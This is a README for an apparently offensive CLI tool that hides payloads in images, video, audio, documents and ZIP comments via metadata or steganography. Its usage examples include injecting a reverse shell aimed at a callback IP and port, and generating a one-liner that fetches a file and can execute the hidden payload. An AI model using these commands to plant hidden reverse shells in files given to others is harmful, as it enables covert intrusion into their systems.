# Steganography Hidden Payload Injector

Educational and research-oriented tool for embedding and extracting payloads in media files via metadata fields or steganography.

Safety notice: Use only on files you own or have explicit permission to test. The one-liner generator defaults to extraction only; execution is opt-in.

## Features
- Media compatibility checks
- Reverse shell payload generation
- Metadata injection for common media types
- Steganography injection via steghide (supported formats only)
- Payload extraction
- Base64 encoding for payloads and one-liners
- One-liner generator with explicit execution opt-in

## Requirements
- Python 3.x
- steghide (for steganography injection)
- exiftool (for metadata injection/extraction)
- ffmpeg and ffprobe (for mp4/mp3 metadata)
- zip and unzip (for zip comments)

Install external dependencies (Debian/Ubuntu):
```bash
sudo apt-get install steghide exiftool ffmpeg unzip zip
```

## Usage
This project provides a Python CLI. The shell script is a thin wrapper that passes arguments through.

Check compatibility:
```bash
python hide-a-payload.py check -f image.jpg
```

Inject a reverse shell payload into metadata:
```bash
python hide-a-payload.py inject -p reverse_shell -i 192.168.1.100 -r 4444 -f video.mp4
```

Inject a custom payload with base64 encoding:
```bash
python hide-a-payload.py inject -p "Your custom payload here" -f image.jpg -b
```

Inject using steganography (supported formats only):
```bash
python hide-a-payload.py inject -p "payload" -f image.jpg -s
```

Extract a payload:
```bash
python hide-a-payload.py extract -f image.jpg
```

Write extracted payload to a file:
```bash
python hide-a-payload.py extract -f image.jpg -o payload.txt
```

Generate a safe one-liner (extraction only):
```bash
python hide-a-payload.py one-liner -f image.jpg -u http://example.com
```

Generate a one-liner that executes the payload (opt-in):
```bash
python hide-a-payload.py one-liner -f image.jpg -u http://example.com --allow-exec
```

## Supported Media Types
Metadata injection and extraction:
- Images: PNG, JPG, JPEG
- Videos: MP4
- Audio: MP3
- Documents: PDF, DOCX
- Archives: ZIP (archive comments)

Steganography injection (steghide):
- JPG, JPEG, BMP, WAV, AU

## Notes
- MP4/MP3 injections default to `injected_<filename>` unless `--out` is provided.
- Exiftool writes in-place by default; `--out` can be used to preserve originals where supported.

## Inspiration
Inspired by the ideas in rMETASHELL.

## License
GNU GPLv3
